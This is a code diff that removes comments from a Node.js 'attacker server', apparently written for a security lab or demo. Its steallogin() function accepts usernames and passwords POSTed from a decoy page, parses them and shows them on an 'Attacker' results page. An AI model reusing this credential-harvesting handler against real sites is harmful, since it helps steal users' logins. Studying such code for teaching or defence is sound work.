@@ -1,29 +1,14 @@
 var fs = require('fs');
 var qs = require('querystring');
 
-/*
- * attackerserver()
- *
- * Sends attackerserver html response to user
- *
- * response = html format
- */
 function attackerserver(response) {
 	fs.readFile('./attackerserver.html', function(error,data){
 		response.end(data);
 	});
 }
 
-/*	steallogin()
- *
- *	Called from attackerserver.html, outputs the received,
- *	and stolen username and password.
- *
- *	response = html format
- *	request = username and password
- */
 function steallogin(response, request){
-	if (request.method == 'POST') {										// Receive all request data 
+	if (request.method == 'POST') {
 		var procPost = '';
 		request.on('data', function(chunk) {
 			procPost += chunk;
@@ -32,15 +17,15 @@ function steallogin(response, request){
 				request.connection.destroy();
 		});
 
-		request.on('end', function() {									// Finished receiving all request data
+		request.on('end', function() {
 			var Data = function(un, pwd) {
 				this.userName = un;
 				this.password = pwd;
 			}
 
-			var loginData = qs.parse(procPost,'\r\n','=');				// Parse the incoming POST
+			var loginData = qs.parse(procPost,'\r\n','=');				// parse the incoming POST
 			var seedData = new Data(loginData['username'],
-			   						loginData['password']);				// Mongo Object
+			   						loginData['password']);				// mongo Object
 
 			// Output information on another url
 			var body = '<html>'+'<head><h2 align="center"><font color="red">Attacker</font></head>'+
